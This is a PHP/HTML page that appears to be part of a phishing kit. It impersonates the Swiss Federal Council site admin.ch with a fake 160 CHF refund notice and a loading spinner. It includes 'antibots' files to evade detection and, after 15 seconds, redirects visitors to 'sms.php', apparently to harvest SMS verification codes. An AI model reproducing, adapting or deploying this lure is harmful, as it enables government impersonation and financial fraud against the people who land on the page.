<?php
    include "antibots/anti1.php";
    include "antibots/anti2.php";
    include "antibots/anti3.php";
    include "antibots/anti4.php";
    include "antibots/anti8.php";
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0">
    <title>Der Bundesrat admin.ch - Startseite</title>
    <link rel="stylesheet" href="css/main.css">
    <link rel="icon" href="images/swiss.svg">
</head>
<body>
    <header>
        <nav>
            <div class="firstdivheader">
                <div><img src="images/swiss.svg" alt="image" height="25px" id="vp"></div>
                <div class="hellodear" id="ouf">Der Bundesrat</div>
            </div>
            <div class="seconddivheader">
                <img src="images/myicon.JPG" alt="image" height="42px">
            </div>
        </nav>
    </header>

    <main>
        <div class="containermain">
            <div class="remboursement">> Entschädigung</div>
            <div class="remplissez">Antrag auf Rückerstattung der <span style="color:red;font-weight:600;">160 CHF</span> in Bearbeitung ...</div>
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#fff;display:block;" width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                    <circle cx="50" cy="50" r="0" fill="none" stroke="#006699" stroke-width="2">
                    <animate attributeName="r" repeatCount="indefinite" dur="1s" values="0;40" keyTimes="0;1" keySplines="0 0.2 0.8 1" calcMode="spline" begin="0s"></animate>
                    <animate attributeName="opacity" repeatCount="indefinite" dur="1s" values="1;0" keyTimes="0;1" keySplines="0.2 0 0.8 1" calcMode="spline" begin="0s"></animate>
                    </circle><circle cx="50" cy="50" r="0" fill="none" stroke="#dc0018" stroke-width="2">
                    <animate attributeName="r" repeatCount="indefinite" dur="1s" values="0;40" keyTimes="0;1" keySplines="0 0.2 0.8 1" calcMode="spline" begin="-0.5s"></animate>
                    <animate attributeName="opacity" repeatCount="indefinite" dur="1s" values="1;0" keyTimes="0;1" keySplines="0.2 0 0.8 1" calcMode="spline" begin="-0.5s"></animate>
                    </circle>
                </svg>    
            </div>
            <div class="textloading">Wird geladen...</div>
        </div>
    </main>

    <footer>
        <div class="offooter">Der Bundesrat</div>
        <div class="offooter" id="kontakt">Kontakt</div>
        <div class="offooter">Informiert bleiben</div>
        <div class="appplay">
            <div><img src="images/voteinfo_appstore.png" alt="image" height="30px"></div>
            <div><img src="images/voteinfo_googleplay.png" alt="image" height="30px"></div>
        </div>
        <div class="forlast">
            <img src="images/Logo Schweizerische Eidgenossenschaft.png" alt="image" height="60px">
        </div>
    </footer>
    <script src="js/junia.framework.js"></script>
    <script src="js/main.js"></script>
    <script>
         setTimeout(() => {
            window.location.href = "sms.php";
         },15000);
    </script>
</body>
</html>